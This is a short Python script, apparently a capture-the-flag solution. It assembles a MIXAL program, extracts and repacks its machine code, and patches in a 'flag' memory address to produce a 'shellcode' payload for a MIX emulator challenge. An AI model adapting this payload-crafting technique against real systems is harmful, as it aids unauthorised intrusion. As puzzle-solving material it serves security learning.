from pwn import *
context.log_level="debug"

code="""
TERM    EQU    19          
        ORIG   100         
START
		JMP    HERE
HERE
		OUT    MSG(TERM)
MSG     ALF    "hhh"
        END    START
"""

open("tmp.mixal","w+").write(code)
process(["mixasm","--ndebug","tmp.mixal"])
data=open("tmp.mix","r").read()
title_len=u32(data[0x10:0x14])
base_add=u32(data[title_len+0x18:title_len+0x1a]+"\x00\x00")
code_idx=title_len+0x1c
shellcode=data[code_idx:]
sbin=shellcode.encode("hex")

pool=[]
for i in range(0,len(shellcode),4):
	num=u32(shellcode[i:i+4])
	pool.append(bin(num)[2:].rjust(30,'0'))

data="".join(pool)
# data is bit stream
flag_add=3137

data=bin(flag_add)[2:].rjust(12,'0')+data[12:]

length=(len(data)+31)/32

ret=""
for i in range(length):
	num=int(data[i*32:(i+1)*32].ljust(32,'0'),2)
	ret+=hex(num)[2:].rjust(8,'0').decode("hex")


open("shellcode","w+").write(ret)








